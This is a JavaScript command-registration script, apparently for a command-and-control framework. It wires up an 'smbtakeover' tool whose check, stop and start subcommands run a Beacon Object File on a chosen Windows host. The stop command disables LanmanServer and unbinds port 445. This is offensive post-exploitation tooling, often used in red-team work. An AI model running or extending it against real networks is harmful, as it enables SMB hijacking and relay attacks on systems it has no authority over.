var metadata = {
    name: "SMBTakeover-BOF",
    description: "Bind/unbind 445/tcp via SCM manipulation (by @zyn3rgy)"
};

var _cmd_check = ax.create_command("check", "Check status of LanmanServer, srv2, and srvnet services", "smbtakeover check localhost");
_cmd_check.addArgString("host", "Target hostname or IP", "localhost");
_cmd_check.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let host = parsed_json["host"];

    let bof_params = ax.bof_pack("cstr,cstr", [host, "check"]);
    let bof_path = ax.script_dir() + "_bin/smbtakeover.x64.o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SMBTakeover check");
});

var _cmd_stop = ax.create_command("stop", "Disable LanmanServer and stop srv2/srvnet to unbind 445/tcp (requires HIGH/SYSTEM)", "smbtakeover stop localhost");
_cmd_stop.addArgString("host", "Target hostname or IP", "localhost");
_cmd_stop.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let host = parsed_json["host"];

    let bof_params = ax.bof_pack("cstr,cstr", [host, "stop"]);
    let bof_path = ax.script_dir() + "_bin/smbtakeover.x64.o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SMBTakeover stop (unbind 445)");
});

var _cmd_start = ax.create_command("start", "Re-enable LanmanServer to rebind 445/tcp (requires HIGH/SYSTEM)", "smbtakeover start localhost");
_cmd_start.addArgString("host", "Target hostname or IP", "localhost");
_cmd_start.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let host = parsed_json["host"];

    let bof_params = ax.bof_pack("cstr,cstr", [host, "start"]);
    let bof_path = ax.script_dir() + "_bin/smbtakeover.x64.o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: SMBTakeover start (rebind 445)");
});

var cmd_smbtakeover = ax.create_command("smbtakeover", "Bind/unbind 445/tcp via SCM manipulation");
cmd_smbtakeover.addSubCommands([_cmd_check, _cmd_stop, _cmd_start]);

var group_smbtakeover = ax.create_commands_group("SMBTakeover-BOF", [cmd_smbtakeover]);
ax.register_commands_group(group_smbtakeover, ["beacon", "gopher", "kharon"], ["windows"], []);
